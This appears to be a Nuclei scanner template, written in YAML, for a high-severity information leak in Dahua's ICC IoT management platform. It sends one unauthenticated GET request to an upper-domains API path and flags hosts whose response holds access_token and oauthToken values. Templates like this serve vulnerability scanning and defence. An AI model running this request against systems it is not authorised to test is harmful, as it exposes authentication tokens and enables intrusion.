id: dahua-icc-upper-domains-disclosure
info:
  name: 大华ICC智能物联管理平台 upper-domains 存在信息泄露
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://bdziyi.com/66681/
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: dahua,icc,disclosure

http:
  - raw:
      - |
        GET /evo-apigw/evo-cascade/mas/upper-domains HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close

        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'success','access_token','oauthToken')
        condition: and